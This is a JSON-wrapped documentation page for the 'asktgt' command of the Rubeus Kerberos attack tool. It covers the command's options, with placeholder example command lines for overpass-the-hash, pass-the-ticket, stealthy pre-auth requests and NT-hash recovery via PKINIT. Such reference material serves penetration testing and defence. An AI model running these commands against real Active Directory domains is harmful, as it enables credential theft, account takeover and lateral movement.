{"title": "asktgt", "source": "rubeus", "source_label": "Rubeus", "path": "asktgt", "html": "<h1 id=\"asktgt\">asktgt</h1>\n<p>Request a Ticket-Granting-Ticket (TGT) from a hash, key, password, or certificate. Sends raw AS-REQ traffic directly to the KDC — no LSASS interaction required.</p>\n<h2 id=\"usage\">Usage</h2>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe asktgt /user:&lt;username&gt; &lt;/password:&lt;password&gt; [/enctype:DES|RC4|AES128|AES256] | /des:&lt;hash&gt; | /rc4:&lt;rc4&gt; | /aes128:&lt;aes128-key&gt; | /aes256:&lt;aes256-key&gt;&gt; [/domain:&lt;domain&gt;] [/dc:&lt;dc-ip&gt;] [/outfile:&lt;output&gt;] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]\n</code></pre></div>\n<h2 id=\"options\">Options</h2>\n<ul>\n<li><code>/user:&lt;username&gt;</code> — target username</li>\n<li><code>/password:&lt;password&gt;</code> — plaintext password (defaults to RC4 enctype)</li>\n<li><code>/rc4:&lt;rc4&gt;</code> — RC4/NTLM hash</li>\n<li><code>/aes256:&lt;aes256-key&gt;</code> — AES256 key</li>\n<li><code>/aes128:&lt;aes128-key&gt;</code> — AES128 key</li>\n<li><code>/des:&lt;hash&gt;</code> — DES key</li>\n<li><code>/domain:&lt;domain&gt;</code> — FQDN of target domain (defaults to current)</li>\n<li><code>/dc:&lt;dc-ip&gt;</code> — domain controller FQDN or IP (defaults to current)</li>\n<li><code>/enctype:DES|RC4|AES128|AES256</code> — force specific encryption type</li>\n<li><code>/ptt</code> — pass-the-ticket, apply to current logon session</li>\n<li><code>/luid</code> — apply to specific logon session (elevated)</li>\n<li><code>/outfile:&lt;output&gt;</code> — save ticket to file</li>\n<li><code>/nowrap</code> — don't line-wrap base64 output</li>\n<li><code>/opsec</code> — send initial AS-REQ without preauth (stealthier)</li>\n<li><code>/nopac</code> — request TGT without PAC</li>\n<li><code>/createnetonly:C:\\Windows\\System32\\cmd.exe</code> — create sacrificial process, apply ticket there</li>\n<li><code>/show</code> — show the created process window</li>\n<li><code>/certificate:&lt;path.pfx&gt;</code> — use PKINIT certificate authentication</li>\n<li><code>/getcredentials</code> — retrieve NT hash via U2U after PKINIT</li>\n<li><code>/changepw</code> — request TGT suitable for Kerberos password change</li>\n<li><code>/service:&lt;spn&gt;</code> — request service ticket via AS-REQ directly</li>\n<li><code>/proxyurl:&lt;url&gt;</code> — use KDC proxy (MS-KKDCP)</li>\n<li><code>/suppenctype:DES|RC4|AES128|AES256</code> — suppress encryption type</li>\n</ul>\n<h2 id=\"examples\">Examples</h2>\n<div class=\"highlight\"><pre><span></span><code># RC4 hash, apply to current session\nRubeus.exe asktgt /user:&lt;username&gt; /rc4:&lt;rc4&gt; /domain:&lt;domain&gt; /ptt\n\n# AES256, create sacrificial process (elevated)\nRubeus.exe asktgt /user:&lt;username&gt; /domain:&lt;domain&gt; /aes256:&lt;aes256-key&gt; /createnetonly:C:\\Windows\\System32\\cmd.exe /show\n\n# Password-based\nRubeus.exe asktgt /user:&lt;username&gt; /password:&lt;password&gt; /domain:&lt;domain&gt; /dc:&lt;dc-ip&gt; /ptt\n\n# PKINIT certificate + retrieve NT hash\nRubeus.exe asktgt /user:&lt;username&gt; /domain:&lt;domain&gt; /dc:&lt;dc-ip&gt; /getcredentials /certificate:&lt;path.pfx&gt; /password:&lt;password&gt;\n\n# No PAC\nRubeus.exe asktgt /user:&lt;username&gt; /domain:&lt;domain&gt; /nopac\n\n# For password change (expired password)\nRubeus.exe asktgt /user:&lt;username&gt; /password:&lt;password&gt; /changepw /domain:&lt;domain&gt;\n\n# Save to file\nRubeus.exe asktgt /user:&lt;username&gt; /aes256:&lt;aes256-key&gt; /domain:&lt;domain&gt; /outfile:&lt;output&gt;\n</code></pre></div>\n<h2 id=\"notes\">Notes</h2>\n<ul>\n<li>No elevated privileges required to request TGTs for the <strong>current</strong> logon session</li>\n<li><code>/luid</code> and <code>/createnetonly</code> require elevation</li>\n<li>Only one TGT can be applied per logon session at a time with <code>/ptt</code> — use <code>/createnetonly</code> to avoid clobbering existing tickets</li>\n<li><code>/opsec</code> forces AES256 by default; use <code>/force</code> to override with other enc types</li>\n<li>Decode saved base64 blob: <code>[IO.File]::WriteAllBytes(\"ticket.kirbi\", [Convert]::FromBase64String(\"&lt;base64&gt;\"))</code></li>\n</ul>", "excerpt": "asktgt Request a Ticket-Granting-Ticket (TGT) from a hash, key, password, or certificate. Sends raw AS-REQ traffic directly to the KDC — no LSASS interaction required. Usage Rubeus.exe asktgt /user:&lt;username&gt; &lt;/password:&lt;password&gt;…", "tags": []}